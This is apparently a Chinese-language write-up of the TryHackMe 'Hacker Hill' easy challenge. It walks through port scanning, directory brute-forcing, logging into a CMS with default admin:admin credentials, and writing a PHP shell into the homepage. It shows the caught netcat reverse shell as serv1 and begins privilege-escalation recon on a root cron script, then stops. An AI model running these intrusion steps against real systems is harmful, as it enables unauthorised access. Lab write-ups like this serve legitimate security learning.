# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# Easy Challenge

# 服务发现
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nmap -sV -Pn 10.10.134.251    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 04:36 EDT
Nmap scan report for 10.10.134.251
Host is up (0.31s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
9999/tcp open  abyss?
```

# 爆破8000端口的目录
```
──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u 10.10.134.251:8000

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-10-25_04-57-13.log

Target: 10.10.134.251:8000                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
[04:57:13] Starting: 
[04:57:22] 200 -    2KB - /about                                                 
[04:57:33] 200 -    2KB - /contact                                                                                
[04:57:47] 500 -  613B  - /public_html/robots.txt                                                              
[04:57:47] 200 -   30B  - /robots.txt             
```

```robots.txt```显示有一个cms
```
User-agent: *
Disallow: /vbcms
```

打开是一个登陆页面，尝试用```admin:admin```登陆，居然登陆上了。。。

登陆进去是一个页面编辑界面，可以直接改网页源代码，尝试写php发现可以运行，那就简单了，直接写shell。。。

开启一个端口监听，把shell写进首页，访问，触发反弹
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.134.251] 59268
Linux web-serv 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:30:53 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp)
$ whoami
serv1

```

根据提示，第一个flag在```/usr/games/fortune```，去到[这个网站](https://ctf.hacker101.com/ctf/flagcheck)兑换到tryhackme需要的flag

然后第二个，第三个按照指示去到```/var/lib/rary```和```/var/www/serv4/index.php```起上面网站兑换指定flag

# 提权
传linpeas.sh，发现```/home/serv3/backups/backup.sh```这个定时任务是用root身份执行的，频率为一分钟一次

查看bash文件权限
```
serv1@web-serv:/tmp$ ls -alh /home/serv3/backups/backup.sh
ls -alh /home/serv3/backups/backup.sh
-r-xr-xr-x 1 serv3 serv3 52 Feb 15  2021 /home/serv3/backups/backup.sh
```

serv1没有权限编辑这个文件，也就是说我们需要横向提权到serv3？
